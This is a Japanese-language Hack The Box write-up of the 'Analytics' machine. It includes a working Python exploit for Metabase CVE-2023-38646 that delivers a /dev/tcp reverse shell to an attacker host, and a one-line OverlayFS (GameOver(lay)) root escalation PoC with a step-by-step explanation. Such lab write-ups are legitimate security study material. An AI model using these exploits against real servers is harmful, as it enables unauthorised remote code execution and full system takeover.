---
date: "2023-12-24"
posted: "2024-04-07"
title: "HTB Analytics Write-up"
tags: ["Hack The Box", "Metabase", "Spring Boot Actuators", "Authentication Bypass", "OS Command Injection","CVE-2023-38646", "CVE-2023-2640", "CVE-2023-32629", "OverlayFS", "Container", "名前空間", "Namespace", "Ubuntu"]
---


# HTB Analytics Write-up

## 1. nmap

次の`nmap`コマンドの結果は以下。

```
$ sudo nmap -A -p- -T4 -sV -sC -oN nmap_ipaddr.txt 10.10.11.233
```

![](./img/Analytics02.png)

画像の結果から、稼働しているのはSSHとHTTPのみと言うことがわかる。

---

## 2. MetabaseへのExploitによるRCE

### 2.1 稼働しているサービスの特定
1項のポートスキャンの結果から、HTTPが稼働していることがわかったためアクセスすると、次のような画面が表示される。

![](./img/Analytics03.png)

右上にはlogin画面があることもわかる。

![](./img/Analytics04.png)

このログイン画面にアクセスするとMetabaseを使用していることがわかる。

### 2.2 Metabaseの脆弱性(CVE-2023-38646)

Metabaseが使用されていることがわかったため、これに脆弱性がないか調査したところ、CVE-2023-38646で認証していなくてもRemote Code Executionが可能な脆弱性があることがわかった。

![](./img/Analytics05.png)

これについてさらに調べると、[Assesnote - Chaining our way to Pre-Auth RCE in Metabase](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)という記事から次の2ステップでRCEが可能なことがわかった。

1. `/api/session/propeties`にアクセスして`setup-token`を入手する
2. 1で入手した`setup-token`をセットして`/api/setup/validate`にExploitコードを埋めんでRCEを実行する

これを実行するPythonコードは次のようになる。

```python
import requests
import json
import base64
import argparse

parser = argparse.ArgumentParser(description="Metabase Exploit")
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL")
parser.add_argument("--lhost", type=str, required=True, help="Local host's ip address")
parser.add_argument("--lport", type=str, required=True, help="Local port for reverse shell")

args = parser.parse_args()
target_host = args.url
lhost = args.lhost
lport = args.lport

url = "%s/api/session/properties" % target_host

res = requests.get(url)

data = res.json()
setup_token = data.get("setup-token")
print(setup_token)

exploit = "/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
exploit_base64 = base64.b64encode(exploit.encode()).decode()

payload = {
        "token": setup_token,
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,%s}|{base64,-d}|{bash,-i}')\n$$--=x" % exploit_base64,
                "advanced-options": False,
                "ssl": True
            },
            "name": "test",
            "engine": "h2"
        }
    }

headers = { "Content-Type": "application/json" }
url = "%s/api/setup/validate" % target_host

res = requests.post(url, headers=headers, data=json.dumps(payload))

print(exploit)
print(exploit_base64)
print(payload)
print(res.status_code)
print("Exploit!!")
```

これを実行するとリバースシェルを獲得できた。

![](./img/Analytics08.png)

![](./img/Analytics09.png)


### 2.3 環境変数からのパスワード取得

2.2にてリバースシェルを獲得した後、`env`コマンドで環境変数を取得すると、Metabaseのユーザ名`META_USER=metalytics`とパスワード`META_PASS=An4lytics_ds20223#`が入手できた。

![](./img/Analytics10.png)

これをsshのユーザ名とパスワードに使用するとアクセスに成功して一般ユーザシェルが獲得できる。

![](./img/Analytics11.png)

---

## 3. GameOver(lay)によるroot権限獲得

### 3.1 Kernelのバージョン確認

`uname -a`コマンドを実行するとOS(ディストリビューション)がUbuntuであることと、Kernelバージョンが6.2.0であることがわかる。

![](./img/Analytics12.png)

ここで、UbuntuでありLinux Kernelバージョン6.2.0であることの両方が満たされることでGameOver(lay)の脆弱性がある可能性が考えられる。
GameOver(lay)であるCVE-2023-2640、CVE-2023-32629がの脆弱性があるUbuntuとLinux kernelのバージョンリストを下の図に示す。

![](./img/Analytics14.png)

### 3.2 GameOver(lay)を利用した攻撃

GameOver(lay)が利用可能なようなのでPoCを使用してみる。GameOver(lay)(CVE-2023-2640、CVE-2023-32629)の詳細については別記事にて整理・紹介するが、PoCの動作だけは見てみる。
PoCは[Github - g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main)を利用した。

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

#### 3.2.1 PoCの動作

上記のPoCは次の2ステップからなる。
1. `unshare`コマンドにてOverlayFSをrootのCapabilityを継承したPython3を含むOverlayFSを作成・マウントする
2. 1でマウントしたOverlayFSからPython3を実行する。

これにより、ホストとは別の`unshare`により作成された名前空間のrootで作成された`l/python3`がCVE2023-2640,32629の脆弱性によりホストのroot権限(Capability含む)を持つPython3となり、rootとして実行するPythonスクリプトによりrootシェルを作成できる。

##### (1) unshareによるOverlayFSの作成・マウント

まずは前半部分、`unshare`コマンドの動作についてを説明する。
`unshare`コマンドとはは新しく作成した名前空間でプログラムを走らせるコマンド。各オプションについては、
- `-r, --map-root-user`は現在のUID、GIDに新しく生成された名前空間でrootのUID、GIDを割り付けてプログラムを実行するというオプション。
- `-m, --mount`はマウント名前空間を共有しないというオプション。
- `-c, --map-current-user`は新しく生成した名前空間のプロセスと同じUID/GIDで指定したコマンドを実行するオプション。

そのため、rootのUID/GIDを持ち、元のマウント空間とは独立したマウント空間で`sh`を走らせ、その中で`mkdir ...`を実行する。
`mkdir l u w m`ではOverlayFSにてマウントするためのディレクトリの作成を行い、`cp /u*/b*/p*3 l/`ではPython3をOverlayFSのlowerディレクトリにコピー、`setcap cap_setuid+eip l/python3`でコピーしてきたPython3がOverlayFS上でもrootのUIDとEffective/Inheritable/PermittedのCapabilitiy setを保持するように設定している。
そして、`mount -t overlay overlay =o rw lowerdir=l,upperdir=u,workdir=w m && touch m/*;`でOverlayFSを作成・マウントする。

##### (2) Python3によるrootシェルの作成

最後の
```
u/python3 -c "import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmpbash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")
```
ではrootとして`os.system`内のコマンドを実行しているだけで特段難しいことはない。
ただ、ホスト上での`u/python3`実行であるにも限らず`setuid(0)`ができるのは、Step1でCVE-2023-2640,32629の脆弱性を利用しroot権限とCapabilitiesを持った`u/pyton3`を生成できたためである。

最後の`&& rm -rf l m u w /var/tmp/bash`は`/var/tmb/bash`が終了した後のクリーンアップである。

#### 3.2.2 PoCの実行

実際にPoCを実行した結果が以下。

[](./img/Analytics17.png)

[](./img/Analytics18.png)

最終的にrootを獲得することができた。

---

## 4. まとめ
HTB Keeperで用いたテクニックや知識を整理以下のように整理した。
- User
  - Web Exploitation
    - MetabaseのRCE脆弱性 CVE-2023-38646
      - Spring Boot ActuatorsからのCredential情報流出
      - Credential情報を利用したRCE可能なエンドポイントへのアクセス
      - OS Command Injection
  - 環境変数からの認証情報の取得
- Root
  - Enumeration
    - OS(ディストリビューション)の特定
    - Kernel情報の取得
  - Exploit
    - GameOver(lay) CVE-2023-2640、CVE-2023-32629を利用したUbuntu + 特定バージョンのKernelに対するPE